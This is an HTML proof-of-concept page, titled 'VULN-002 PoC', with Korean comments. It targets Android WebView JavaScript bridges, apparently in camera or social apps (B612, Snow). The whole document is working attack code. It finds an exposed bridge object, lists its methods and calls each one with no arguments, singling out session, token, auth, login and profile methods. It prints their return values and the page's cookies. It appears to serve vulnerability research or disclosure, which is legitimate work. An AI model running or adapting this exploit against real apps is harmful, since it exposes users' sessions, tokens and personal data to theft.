
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{background:#111;color:#eee;font-family:monospace;font-size:12px;padding:12px;word-break:break-all}
.t{color:#f85149;font-weight:bold;font-size:14px;display:block;margin-bottom:10px}
.s{background:#161b22;border:1px solid #30363d;border-radius:5px;padding:8px 10px;margin-bottom:8px}
.k{color:#e3b341;min-width:110px;display:inline-block;vertical-align:top}
.v{color:#79c0ff}
.hi{color:#f85149;font-weight:bold}
.ok{color:#3fb950;font-weight:bold}
</style>
</head>
<body>
<span class="t">⚠ VULN-002 PoC — Bridge Method Enumeration</span>
<div id="o"></div>
<script>
var o = document.getElementById('o');
function row(k, v, cls) {
  o.innerHTML += '<div class="s"><span class="k">' + k + '</span><span class="' + (cls||'v') + '">' + String(v) + '</span></div>';
}

// Bridge 탐색
var b = null, bname = '';
['B612KajiBridgeInterface','AndroidBridge','androidBridge','snowBridge'].forEach(function(n){
  try { if (!b && typeof window[n] !== 'undefined') { b = window[n]; bname = n; } } catch(e){}
});

if (!b) {
  row('RESULT', 'Bridge NOT FOUND', 'hi');
} else {
  row('Bridge', bname + ' FOUND', 'ok');

  // 전체 메서드 열거
  var methods = [];
  try {
    for (var k in b) {
      try {
        if (typeof b[k] === 'function') methods.push(k);
      } catch(e) {}
    }
  } catch(e) {}

  row('메서드 수', methods.length, 'ok');
  row('메서드 목록', methods.join(' | ') || '(empty)', 'v');

  // 세션/유저 관련 메서드 탐색
  var sessionMethods = methods.filter(function(m){
    var ml = m.toLowerCase();
    return ml.indexOf('session') >= 0 || ml.indexOf('user') >= 0 ||
           ml.indexOf('personal') >= 0 || ml.indexOf('info') >= 0 ||
           ml.indexOf('login') >= 0 || ml.indexOf('profile') >= 0 ||
           ml.indexOf('account') >= 0 || ml.indexOf('token') >= 0 ||
           ml.indexOf('auth') >= 0;
  });

  if (sessionMethods.length) {
    row('관련 메서드', sessionMethods.join(' | '), 'hi');

    // 관련 메서드 각각 호출 시도 (인자 없이)
    sessionMethods.forEach(function(m) {
      try {
        var r = b[m]();
        row(m + '()', r === undefined ? '(undefined)' : String(r), 'hi');
      } catch(e) {
        row(m + '()', String(e), 'v');
      }
    });
  }

  // 인자 없이 호출 가능한 모든 메서드 시도
  row('--- 전체 호출 시도 ---', '', 'ok');
  methods.forEach(function(m) {
    try {
      var r = b[m]();
      if (r !== undefined && r !== null && String(r).length > 0 && String(r) !== 'undefined') {
        row(m + '()', String(r).substring(0, 200), 'hi');
      }
    } catch(e) {
      // 오류는 무시 (인자 필요한 메서드)
    }
  });

  // Cookie
  row('cookie', document.cookie || '(empty)', document.cookie ? 'hi' : 'v');
}
</script>
</body>
</html>
